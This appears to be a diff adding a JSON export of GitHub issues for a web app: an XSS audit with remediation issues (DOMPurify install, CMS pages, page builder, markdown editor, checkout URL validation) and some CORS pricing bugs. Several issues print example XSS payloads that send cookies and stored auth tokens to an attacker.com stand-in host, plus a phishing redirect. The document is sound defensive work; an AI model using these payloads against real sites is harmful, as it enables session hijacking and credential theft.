@@ -1,0 +1,441 @@
+[
+    {
+        "body": "## Security Audit: XSS Vulnerability Remediation\n\n**Status**: Open  \n**Priority**: CRITICAL  \n**Type**: Security Audit  \n\n### Executive Summary\n\nA comprehensive XSS vulnerability scan identified **11 critical/high severity vulnerabilities** across the frontend codebase.\n\n**CRITICAL FINDING**: DOMPurify is NOT INSTALLED - no HTML sanitization is currently in place.\n\n---\n\n## Vulnerability Summary\n\n| Severity | Count | Type |\n|----------|-------|------|\n| CRITICAL | 8 | Unsanitized HTML Rendering |\n| CRITICAL | 3 | ContentEditable XSS |\n| HIGH | 1 | URL Injection |\n\n**Total Vulnerabilities**: 11  \n**CVSS Score Range**: 7.5 - 9.8\n\n---\n\n## Issue Breakdown\n\n### 1. Infrastructure (Prerequisite)\n- **#53** - Install DOMPurify and create sanitization utility\n  - **Status**: Must be completed FIRST\n  - **Priority**: CRITICAL\n  - **Blocks**: All other fixes\n\n### 2. CMS Content Vulnerabilities\n- **#54** - Fix XSS in CMS pages (Terms, Privacy, Features)\n  - **Files**: 3 pages affected\n  - **Severity**: CRITICAL (9.8/10)\n  - **Depends on**: #53\n\n### 3. Page Builder Vulnerabilities  \n- **#55** - Fix Stored XSS in Visual Page Builder\n  - **Files**: VisualPageBuilder.tsx (3 locations)\n  - **Severity**: CRITICAL (9.6/10)\n  - **Depends on**: #53\n\n### 4. Editor Vulnerabilities\n- **#56** - Fix XSS in Rich Text Editor markdown parser\n  - **Files**: RichTextEditor.tsx\n  - **Severity**: CRITICAL (8.9/10)\n  - **Depends on**: #53\n\n### 5. URL Security\n- **#57** - Fix URL injection in billing checkout\n  - **Files**: billing/page.tsx\n  - **Severity**: HIGH (7.5/10)\n  - **Depends on**: #53\n\n---\n\n## Implementation Roadmap\n\n### Phase 1: Foundation\n- [ ] #53 - Install DOMPurify\n- [ ] #53 - Create sanitize.ts utility\n\n### Phase 2: Critical Fixes\n- [ ] #54 - Fix CMS pages\n- [ ] #55 - Fix Visual Page Builder\n- [ ] #56 - Fix Rich Text Editor\n\n### Phase 3: High Priority\n- [ ] #57 - Fix billing URL injection\n- [ ] Add automated security tests\n\n### Phase 4: Hardening\n- [ ] Implement Content Security Policy\n- [ ] Add backend input validation\n- [ ] Security documentation\n\n---\n\n## Risk Assessment\n\n### Before Remediation\n- **Risk Level**: CRITICAL\n- **Exploitability**: HIGH\n- **Impact**: Site-wide compromise\n- **Business Risk**: Data breach, regulatory fines\n\n### After Remediation  \n- **Risk Level**: LOW\n- **Exploitability**: LOW\n- **Impact**: Minimal\n\n---\n\n## Success Criteria\n\n- [ ] All 11 vulnerabilities patched\n- [ ] DOMPurify installed and configured\n- [ ] 100% test coverage for XSS scenarios\n- [ ] No new dangerouslySetInnerHTML without sanitization\n- [ ] Security code review process established\n\n---\n\n## Issue Dependencies\n\nStart with #53 - all other fixes depend on it:\n- #53 (DOMPurify) blocks #54, #55, #56, #57\n\n---\n\n## Timeline\n\n- **Week 1**: Complete #53, #54, #55\n- **Week 2**: Complete #56, #57, testing\n- **Week 3**: CSP, documentation\n\n**Target Completion**: 3 weeks\n\n---\n\n## References\n\n- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n- DOMPurify: https://github.com/cure53/DOMPurify",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuG9hg",
+                "name": "critical",
+                "description": "Critical priority - fix immediately",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 58,
+        "title": "[SECURITY AUDIT] XSS Vulnerability Remediation - Frontend Security Hardening"
+    },
+    {
+        "body": "## HIGH: URL Injection in Billing Checkout\n\n**Priority**: HIGH  \n**Type**: Security - Open Redirect / URL Injection  \n**CWE**: CWE-601 (Open Redirect), CWE-79 (XSS)  \n**Severity**: 7.5/10 (CVSS)\n\n### Vulnerability Description\nThe billing checkout flow opens URLs received from the API without validation. If the backend is compromised or returns malicious URLs, this can lead to:\n- **Open redirect** to phishing pages\n- **JavaScript execution** via javascript: protocol\n- **Data URI attacks** via data: protocol\n\n### Affected File\n**frontend/src/app/billing/page.tsx:147-155**\n\n### Vulnerable Code\n\n```tsx\nconst handleUpgrade = async (planId: string) => {\n  // ... API call\n  \n  if (response.ok) {\n    const data = await response.json();\n    \n    // UNSAFE - No URL validation before opening\n    window.open(data.checkout_url, '_blank');\n  }\n}\n```\n\n### Attack Scenarios\n\n**Scenario 1: JavaScript Protocol Injection**\n- API returns: {\"checkout_url\": \"javascript:alert('XSS')\"}\n- Result: JavaScript executes in browser\n\n**Scenario 2: Phishing Redirect**\n- API returns: {\"checkout_url\": \"https://evil-polar-clone.com/checkout\"}\n- Result: User redirected to fake payment page\n\n### Fix Implementation\n\n```tsx\nimport { sanitizeUrl } from '@/utils/sanitize';\nimport { toast } from 'react-toastify';\n\nconst handleUpgrade = async (planId: string) => {\n  // ... existing code\n  \n  if (response.ok) {\n    const data = await response.json();\n    \n    // CRITICAL FIX: Validate URL before opening\n    const safeUrl = sanitizeUrl(data.checkout_url);\n    \n    if (safeUrl === '#') {\n      console.error('Invalid checkout URL:', data.checkout_url);\n      toast.error('Invalid checkout URL. Please contact support.');\n      return;\n    }\n    \n    // Additional validation: Ensure Polar domain\n    if (!safeUrl.includes('polar.sh')) {\n      toast.error('Invalid payment provider URL.');\n      return;\n    }\n    \n    window.open(safeUrl, '_blank');\n  }\n};\n```\n\n### Testing\n1. Modify API to return: javascript:alert('XSS')\n2. Click upgrade button\n3. BEFORE FIX: Alert executes\n4. AFTER FIX: Error message shown\n\n### Dependencies\n- Requires: #53 (DOMPurify sanitizeUrl)\n\n### Success Criteria\n- [ ] URL validation before window.open()\n- [ ] Domain whitelist for polar.sh\n- [ ] Error messages for invalid URLs\n- [ ] Automated tests added\n\n### Impact\n- **Risk**: Phishing, credential theft, XSS\n- **Users**: Users upgrading to paid plans\n- **Likelihood**: LOW (requires backend compromise)\n- **Impact**: HIGH (financial fraud)\n\n### References\n- CWE-601: https://cwe.mitre.org/data/definitions/601.html\n- OWASP URL Validation: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCrQ",
+                "name": "bug",
+                "description": "Something isn't working",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHAvg",
+                "name": "high",
+                "description": "High priority - fix soon",
+                "color": "ff9500"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 57,
+        "title": "[SECURITY] Fix URL injection in billing checkout flow"
+    },
+    {
+        "body": "## \u00f0\u0178\u0161\u00a8 CRITICAL: XSS via Unsafe Markdown Parser\n\n**Priority**: CRITICAL  \n**Type**: Security - Reflected/Stored XSS  \n**CWE**: CWE-79 (Cross-Site Scripting)  \n**Severity**: 8.9/10 (CVSS)\n\n### Vulnerability Description\nThe Rich Text Editor implements a custom markdown-to-HTML parser using regex that **does not escape HTML entities**. This allows raw HTML/JavaScript to pass through unchanged and execute in the preview pane. If content is saved, this becomes a **stored XSS vulnerability**.\n\n### Affected File\n**`frontend/src/components/editor/RichTextEditor.tsx:236-320`**\n\n### Vulnerable Code\n\n```tsx\nconst renderPreview = () => {\n  // \u00e2\udc9d\u0152 UNSAFE - Custom parser doesn't escape HTML\n  let html = content\n    .replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>')\n    .replace(/\\*(.*?)\\*/g, '<em>$1</em>')\n    .replace(/`(.*?)`/g, '<code class=\"bg-gray-100 px-1 rounded\">$1</code>')\n    // ... more regex replacements\n  \n  return { __html: html }; // \u00e2\udc9d\u0152 No sanitization\n};\n\n// Rendered as:\n<div dangerouslySetInnerHTML={renderPreview()} />\n```\n\n### Attack Scenarios\n\n#### Scenario 1: Reflected XSS (Preview Mode)\n1. User types in editor: `Hello <img src=x onerror=alert('XSS')>`\n2. Clicks \"Preview\" button\n3. Custom markdown parser processes content\n4. Raw HTML passes through unchanged\n5. **Script executes immediately** in preview pane\n\n#### Scenario 2: Stored XSS (If Content is Saved)\n1. User creates content with embedded script\n2. Saves to database\n3. Content rendered on public page\n4. **All visitors** execute the malicious script\n\n### Why This Happens\n\nThe custom regex-based markdown parser:\n- Processes markdown syntax (`**bold**`, `*italic*`)\n- **BUT** does not escape HTML entities in user input\n- User input like `<script>` or `<img onerror=>` is preserved\n\n**Expected**: HTML should be escaped to `&lt;script&gt;`  \n**Actual**: HTML remains as `<script>` and executes\n\n### Example Exploit Payloads\n\n```html\n<!-- Image-based XSS -->\n<img src=x onerror=\"fetch('https://attacker.com/steal?data='+document.cookie)\">\n\n<!-- SVG-based XSS -->\n<svg onload=\"alert('XSS')\">\n\n<!-- IFrame injection -->\n<iframe src=\"javascript:alert('XSS')\"></iframe>\n\n<!-- Embedded script -->\n<script>\n  // Steal session token\n  fetch('https://attacker.com/log', {\n    method: 'POST',\n    body: JSON.stringify({\n      token: localStorage.getItem('authToken'),\n      cookies: document.cookie\n    })\n  });\n</script>\n```\n\n### Fix Implementation\n\n#### Option 1: Sanitize After Markdown Parsing (Quick Fix)\n\n```tsx\nimport { sanitizeHtml } from '@/utils/sanitize';\n\nconst renderPreview = () => {\n  let html = content\n    .replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>')\n    .replace(/\\*(.*?)\\*/g, '<em>$1</em>')\n    .replace(/`(.*?)`/g, '<code class=\"bg-gray-100 px-1 rounded\">$1</code>')\n    // ... other replacements\n  \n  // \u00e2\u0153\u2026 CRITICAL FIX: Sanitize after markdown conversion\n  return { __html: sanitizeHtml(html) };\n};\n```\n\n#### Option 2: Use Trusted Markdown Library (Recommended)\n\nReplace custom parser with a battle-tested library:\n\n```bash\nnpm install marked dompurify\nnpm install --save-dev @types/marked\n```\n\n```tsx\nimport { marked } from 'marked';\nimport { sanitizeHtml } from '@/utils/sanitize';\n\nconst renderPreview = () => {\n  // Parse markdown with trusted library\n  const rawHtml = marked.parse(content);\n  \n  // Sanitize the output\n  return { __html: sanitizeHtml(rawHtml) };\n};\n```\n\n**Why use a library?**\n- Handles edge cases (nested formatting, escaped characters)\n- Actively maintained and security-audited\n- Supports full markdown spec\n- Better performance\n\n### Testing\n\n#### Manual Testing\n1. Type in editor: `**Bold** and <img src=x onerror=alert('XSS')>`\n2. Click preview\n\n**BEFORE FIX**: Alert executes \u00e2\udc9d\u0152  \n**AFTER FIX**: HTML is escaped, shows as text \u00e2\u0153\u2026\n\n#### Automated Testing\n```typescript\nimport { sanitizeHtml } from '@/utils/sanitize';\n\ndescribe('RichTextEditor security', () => {\n  test('escapes HTML in preview', () => {\n    const malicious = '**Bold** <script>alert(\"XSS\")</script>';\n    const preview = renderPreview(malicious);\n    \n    expect(preview.__html).not.toContain('<script');\n    expect(preview.__html).toContain('<strong>Bold</strong>');\n  });\n\n  test('handles image XSS', () => {\n    const malicious = '<img src=x onerror=alert(\"XSS\")>';\n    const preview = renderPreview(malicious);\n    \n    expect(preview.__html).not.toContain('onerror');\n  });\n});\n```\n\n### Comparison: Custom Parser vs Marked\n\n| Feature | Custom Regex | Marked + Sanitize |\n|---------|--------------|-------------------|\n| **Security** | \u00e2\udc9d\u0152 Vulnerable | \u00e2\u0153\u2026 Safe |\n| **HTML Escaping** | \u00e2\udc9d\u0152 No | \u00e2\u0153\u2026 Yes |\n| **Full Markdown** | \u00e2\udc9d\u0152 Partial | \u00e2\u0153\u2026 Complete |\n| **Maintenance** | \u00e2\udc9d\u0152 Manual | \u00e2\u0153\u2026 Community |\n| **Performance** | \u00e2\u0153\u2026 Fast | \u00e2\u0153\u2026 Fast |\n\n### Dependencies\n- Requires: #53 (Install DOMPurify)\n- Optional: Install `marked` for better markdown parsing\n\n### Success Criteria\n- [ ] Sanitization added to `renderPreview()`\n- [ ] Manual XSS testing passes\n- [ ] Automated security tests added\n- [ ] Consider migrating to `marked` library\n- [ ] Code review approved\n\n### Migration Path (Optional Enhancement)\n\nIf migrating to `marked`:\n1. Install `marked` and `@types/marked`\n2. Replace `renderPreview()` implementation\n3. Test markdown rendering matches current behavior\n4. Add sanitization with DOMPurify\n5. Deploy incrementally\n\n### Impact\n- **Immediate Risk**: Reflected XSS in editor preview\n- **Secondary Risk**: If content is saved, becomes stored XSS\n- **Users Affected**: Editor users (immediate), all users (if saved)\n\n### References\n- Marked.js: https://marked.js.org/\n- XSS via Markdown: https://github.com/commonmark/commonmark-spec/issues/101\n- OWASP Markdown XSS: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCwA",
+                "name": "enhancement",
+                "description": "New feature or request",
+                "color": "a2eeef"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuG9hg",
+                "name": "critical",
+                "description": "Critical priority - fix immediately",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 56,
+        "title": "[SECURITY] Fix XSS in Rich Text Editor custom markdown parser"
+    },
+    {
+        "body": "## \u00f0\u0178\u0161\u00a8 CRITICAL: Stored XSS in Visual Page Builder\n\n**Priority**: CRITICAL  \n**Type**: Security - Stored XSS  \n**CWE**: CWE-79 (Cross-Site Scripting)  \n**Severity**: 9.6/10 (CVSS)\n\n### Vulnerability Description\nThe Visual Page Builder allows users to edit HTML content directly via `contentEditable` and saves raw `innerHTML` to the database without sanitization. This creates a **stored XSS vulnerability** where malicious scripts persist and execute for all users viewing the built pages.\n\n### Affected File\n**`frontend/src/components/builder/VisualPageBuilder.tsx`**\n\n### Vulnerable Code Locations\n\n#### Line 418-425 (Text Blocks)\n```tsx\n// \u00e2\udc9d\u0152 UNSAFE - No sanitization on render OR save\n<div\n  dangerouslySetInnerHTML={{ __html: block.content.html }}\n  contentEditable={!previewMode && selectedBlockId === block.id}\n  onBlur={(e) => {\n    if (!previewMode) {\n      updateBlock(block.id, {\n        // Reading raw innerHTML including any injected scripts\n        content: { ...block.content, html: e.currentTarget.innerHTML }\n      });\n    }\n  }}\n/>\n```\n\n#### Additional Instances\n- **Line 516**: Column content rendering\n- **Line 525**: Content block rendering\n\n### Attack Scenario\n\n1. **Attacker edits a text block** in page builder\n2. **Injects malicious HTML**:\n   ```html\n   <p>Normal text</p>\n   <img src=x onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\">\n   ```\n3. **ContentEditable reads `innerHTML`** - includes malicious code\n4. **Saved to database** without sanitization via `updateBlock()`\n5. **All users** viewing the page execute the script\n6. **Result**: Session hijacking, account takeover, data theft\n\n### Real-World Impact\n\n**Privilege Escalation Path**:\n- Admin/editor creates seemingly innocent page\n- Injects JavaScript to steal other admin credentials\n- Compromised credentials used to inject site-wide malware\n- **Entire site compromised**\n\n### Fix Implementation\n\n#### Step 1: Add Sanitization Import\n```tsx\nimport { sanitizeHtml } from '@/utils/sanitize';\n```\n\n#### Step 2: Sanitize on Render (Line 418)\n```tsx\n// \u00e2\u0153\u2026 SAFE - Sanitize before rendering\n<div\n  dangerouslySetInnerHTML={{ __html: sanitizeHtml(block.content.html) }}\n  contentEditable={!previewMode && selectedBlockId === block.id}\n  onBlur={(e) => {\n    if (!previewMode) {\n      updateBlock(block.id, {\n        // \u00e2\u0153\u2026 SAFE - Sanitize before saving\n        content: { \n          ...block.content, \n          html: sanitizeHtml(e.currentTarget.innerHTML) \n        }\n      });\n    }\n  }}\n/>\n```\n\n#### Step 3: Apply Same Fix to Lines 516, 525\n```tsx\n// Line 516\n<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(column.content) }} />\n\n// Line 525  \n<div dangerouslySetInnerHTML={{ __html: sanitizeHtml(contentBlock.content) }} />\n```\n\n### Testing Strategy\n\n#### Manual Testing\n1. Create a text block in page builder\n2. Edit content and inject: `<img src=x onerror=alert('XSS')>`\n3. Save the block\n4. View the page\n\n**BEFORE FIX**: Alert executes \u00e2\udc9d\u0152  \n**AFTER FIX**: Alert does not execute, `onerror` attribute removed \u00e2\u0153\u2026\n\n#### Automated Testing\n```typescript\nimport { render, fireEvent } from '@testing-library/react';\nimport { sanitizeHtml } from '@/utils/sanitize';\n\ntest('sanitizes HTML when saving edited content', () => {\n  const mockUpdate = jest.fn();\n  const { container } = render(<VisualPageBuilder {...props} updateBlock={mockUpdate} />);\n  \n  const editable = container.querySelector('[contenteditable]');\n  editable.innerHTML = '<img src=x onerror=alert(\"XSS\")>';\n  \n  fireEvent.blur(editable);\n  \n  expect(mockUpdate).toHaveBeenCalled();\n  const savedHtml = mockUpdate.mock.calls[0][1].content.html;\n  expect(savedHtml).not.toContain('onerror');\n});\n```\n\n### Dependencies\n- Requires: #53 (Install DOMPurify)\n\n### Additional Considerations\n\n**Backend Validation**:\nAlso add sanitization on the backend API that saves page content:\n```go\n// In internal/handlers/cms.go or similar\nimport \"github.com/microcosm-cc/bluemonday\"\n\nfunc sanitizeHTML(html string) string {\n    p := bluemonday.UGCPolicy()\n    return p.Sanitize(html)\n}\n```\n\n### Success Criteria\n- [ ] All 3 locations updated with sanitization (lines 418, 516, 525)\n- [ ] Sanitization applied on both render AND save\n- [ ] Manual XSS testing passes\n- [ ] Automated tests added\n- [ ] Backend validation added (bonus)\n- [ ] Code review approved\n\n### Impact Assessment\n- **Users Affected**: All users viewing builder-created pages\n- **Attack Persistence**: Stored in database, affects all future visitors\n- **Business Risk**: Site-wide compromise, regulatory fines, reputation damage\n\n### References\n- OWASP Stored XSS: https://owasp.org/www-community/attacks/xss/#stored-xss-attacks\n- ContentEditable Security: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCrQ",
+                "name": "bug",
+                "description": "Something isn't working",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuG9hg",
+                "name": "critical",
+                "description": "Critical priority - fix immediately",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 55,
+        "title": "[SECURITY] Fix Stored XSS in Visual Page Builder (ContentEditable)"
+    },
+    {
+        "body": "## \u00f0\u0178\u0161\u00a8 CRITICAL: XSS Vulnerability in CMS Pages\n\n**Priority**: CRITICAL  \n**Type**: Security - Stored XSS  \n**CWE**: CWE-79 (Cross-Site Scripting)  \n**Severity**: 9.8/10 (CVSS)\n\n### Vulnerability Description\nThree CMS-driven pages render user-controlled HTML content from the database without any sanitization, allowing malicious JavaScript injection that affects all users viewing these pages.\n\n### Affected Files\n\n1. **`frontend/src/app/terms/page.tsx:342`**\n2. **`frontend/src/app/privacy/page.tsx:285`**\n3. **`frontend/src/app/features/page.tsx:261`**\n\n### Vulnerable Code\n\n```tsx\n// \u00e2\udc9d\u0152 UNSAFE - No sanitization\n<div\n  className=\"prose prose-lg max-w-none\"\n  dangerouslySetInnerHTML={{ __html: displayContent?.content || '' }}\n/>\n```\n\n### Attack Scenario\n1. Attacker gains access to CMS backend (or exploits API vulnerability)\n2. Injects malicious HTML/JavaScript into page content\n3. Content stored in database\n4. **All users** viewing the page execute the malicious code\n5. Potential outcomes:\n   - Session hijacking (cookie theft)\n   - Account takeover\n   - Phishing attacks\n   - Malware distribution\n   - Data exfiltration\n\n### Example Exploit Payloads\n```html\n<img src=x onerror=\"fetch('https://attacker.com/steal?cookie='+document.cookie)\">\n<script>alert('XSS')</script>\n<svg onload=\"window.location='https://phishing-site.com'\">\n```\n\n### Fix Implementation\n\n#### Step 1: Add Sanitization Import\n```tsx\nimport { sanitizeHtml } from '@/utils/sanitize';\n```\n\n#### Step 2: Sanitize Before Rendering\n\n**Terms Page (line 342)**:\n```tsx\n// \u00e2\u0153\u2026 SAFE - Sanitized HTML\n<div\n  className=\"prose prose-lg max-w-none\"\n  dangerouslySetInnerHTML={{ __html: sanitizeHtml(displayContent?.content || '') }}\n/>\n```\n\n**Privacy Page (line 285)** - Apply same fix  \n**Features Page (line 261)** - Apply same fix\n\n### Testing\n\n#### Manual Testing\n1. Inject test payload in CMS: `<img src=x onerror=alert('XSS')>`\n2. View the affected page\n3. **BEFORE FIX**: Alert executes \u00e2\udc9d\u0152\n4. **AFTER FIX**: Alert does not execute, HTML is sanitized \u00e2\u0153\u2026\n\n#### Automated Testing\n```typescript\n// Add test in page.test.tsx\nimport { sanitizeHtml } from '@/utils/sanitize';\n\ntest('should sanitize malicious HTML in CMS content', () => {\n  const malicious = '<img src=x onerror=alert(\"XSS\")>';\n  const safe = sanitizeHtml(malicious);\n  expect(safe).not.toContain('onerror');\n  expect(safe).not.toContain('<script');\n});\n```\n\n### Dependencies\n- Requires: #53 (Install DOMPurify)\n\n### Success Criteria\n- [ ] All 3 files updated with sanitization\n- [ ] Manual XSS testing passes\n- [ ] Automated tests added and passing\n- [ ] Code review approved\n- [ ] Deployed to production\n\n### Impact\n- **Users Affected**: ALL users visiting these pages\n- **Data at Risk**: Session tokens, user credentials, personal data\n- **Compliance**: GDPR violation (data breach)\n\n### References\n- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n- CWE-79: https://cwe.mitre.org/data/definitions/79.html",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACJWFCrQ",
+                "name": "bug",
+                "description": "Something isn't working",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuG9hg",
+                "name": "critical",
+                "description": "Critical priority - fix immediately",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 54,
+        "title": "[SECURITY] Fix XSS vulnerabilities in CMS pages (Terms, Privacy, Features)"
+    },
+    {
+        "body": "## \u00f0\u0178\u201d\u2019 Security: Install DOMPurify Library\n\n**Priority**: CRITICAL  \n**Type**: Security  \n**CWE**: CWE-79 (Cross-Site Scripting)\n\n### Problem\nThe frontend application currently has NO HTML sanitization library installed, leaving all `dangerouslySetInnerHTML` usage vulnerable to XSS attacks.\n\n### Required Action\n\n#### 1. Install DOMPurify\n```bash\ncd frontend\nnpm install dompurify\nnpm install --save-dev @types/dompurify\n```\n\n#### 2. Create Sanitization Utility\n\nCreate `frontend/src/utils/sanitize.ts`:\n\n```typescript\nimport DOMPurify from 'dompurify';\n\n/**\n * Sanitize HTML content to prevent XSS attacks\n * @param dirty - Unsanitized HTML string\n * @param options - DOMPurify configuration\n * @returns Sanitized HTML string safe for rendering\n */\nexport function sanitizeHtml(\n  dirty: string,\n  options?: DOMPurify.Config\n): string {\n  const defaultConfig: DOMPurify.Config = {\n    ALLOWED_TAGS: [\n      'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6',\n      'ul', 'ol', 'li', 'a', 'img', 'blockquote', 'code', 'pre', 'div', 'span'\n    ],\n    ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id'],\n    ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,\n  };\n\n  return DOMPurify.sanitize(dirty, { ...defaultConfig, ...options });\n}\n\n/**\n * Strict sanitization - removes all HTML tags\n */\nexport function sanitizeText(dirty: string): string {\n  return DOMPurify.sanitize(dirty, { ALLOWED_TAGS: [] });\n}\n\n/**\n * Sanitize URL to prevent javascript: and data: protocols\n */\nexport function sanitizeUrl(url: string): string {\n  try {\n    const parsed = new URL(url);\n    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {\n      return parsed.href;\n    }\n  } catch {\n    return '#';\n  }\n  return '#';\n}\n```\n\n### Success Criteria\n- [x] DOMPurify installed in package.json\n- [x] TypeScript types installed\n- [x] sanitize.ts utility created with all three functions\n- [x] Utility exports sanitizeHtml, sanitizeText, and sanitizeUrl\n\n### Related Issues\nThis is a prerequisite for fixing:\n- CMS pages XSS vulnerabilities\n- Visual Page Builder XSS\n- Rich Text Editor XSS\n- URL injection issues\n\n### References\n- [DOMPurify Documentation](https://github.com/cure53/DOMPurify)\n- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)",
+        "labels": [
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuG9hg",
+                "name": "critical",
+                "description": "Critical priority - fix immediately",
+                "color": "d73a4a"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHRgg",
+                "name": "frontend",
+                "description": "Frontend React/Next.js",
+                "color": "5319e7"
+            },
+            {
+                "id": "LA_kwDOPo-mUM8AAAACSuHV8A",
+                "name": "security",
+                "description": "Security vulnerability",
+                "color": "ff0000"
+            }
+        ],
+        "number": 53,
+        "title": "[SECURITY] Install DOMPurify and create sanitization utility"
+    },
+    {
+        "body": "# Frontend: Incorrect sync suggestion for enterprise plan\r\n\r\n**Labels:** frontend, user-experience\r\n\r\n## Error\r\n```\r\n[Pricing] Try manually syncing: POST /api/v1/billing/sync-products\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:83:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:153:18)\r\n```\r\n\r\n## Issue\r\nSame as Issue #4, but occurs when rendering the Ultra (enterprise) plan.\r\n\r\nMisleading suggestion - manual sync won't help if CORS blocks the frontend request.\r\n\r\n## Fix\r\nSee Issue #4 for suggested improvement to conditional error messaging.\r\n",
+        "labels": [],
+        "number": 45,
+        "title": "Frontend: Incorrect sync suggestion for enterprise plan"
+    },
+    {
+        "body": "# Frontend: Misleading sync warning for enterprise plan\r\n\r\n**Labels:** frontend, documentation, user-experience\r\n\r\n## Error\r\n```\r\n[Pricing] This may indicate a sync issue with Polar API\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:82:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:153:18)\r\n```\r\n\r\n## Issue\r\nSame as Issue #3, but occurs when rendering the Ultra (enterprise) plan.\r\n\r\nError message suggests Polar API sync problem, but actual issue is CORS blocking requests.\r\n\r\n## Fix\r\nSee Issue #3 for suggested improvement to error messaging.\r\n",
+        "labels": [],
+        "number": 44,
+        "title": "Frontend: Misleading sync warning for enterprise plan"
+    },
+    {
+        "body": "# Frontend: Empty products array for enterprise plan\r\n\r\n**Labels:** bug, frontend, api\r\n\r\n## Error\r\n```\r\n[Pricing] Available products: []\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:81:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:153:18)\r\n```\r\n\r\n## Root Cause\r\nCORS preflight rejection causes fetch to fail, returning empty array instead of 3 products.\r\n\r\n## Context\r\nThis is the same error as Issue #2, but occurs when rendering the Ultra (enterprise) plan card.\r\n\r\n## Fix\r\n\u00e2\u0153\u2026 **FIXED:** Added `http://localhost:8080` to CORS allowed origins in `internal/middleware/cors.go`\r\n",
+        "labels": [],
+        "number": 43,
+        "title": "Frontend: Empty products array for enterprise plan"
+    },
+    {
+        "body": "# Frontend: No product found for plan type 'enterprise' in pricing page\r\n\r\n**Labels:** bug, frontend, polar-integration\r\n\r\n## Error\r\n```\r\n[Pricing] No product found for plan type: enterprise\r\n```\r\n\r\n## Stack Trace\r\n```\r\nat getPolarProductId (src\\app\\pricing\\page.tsx:80:15)\r\nat PricingPage (src\\app\\pricing\\page.tsx:153:18)\r\n```\r\n\r\n## Root Cause\r\nCORS configuration blocks frontend API requests from `http://localhost:8080` origin.\r\n\r\n## Expected Behavior\r\nUltra plan should find product with ID `f5ffabdf-e116-4aba-99f3-cdebe0f09486` and `plan_type: \"enterprise\"`\r\n\r\n## Fix\r\n\u00e2\u0153\u2026 **FIXED:** Added `http://localhost:8080` to CORS allowed origins in `internal/middleware/cors.go`\r\n\r\nSame root cause as Issue #1, but for the enterprise plan.\r\n",
+        "labels": [],
+        "number": 42,
+        "title": "Frontend: No product found for plan type 'enterprise' in pricing page"
+    },
+    {
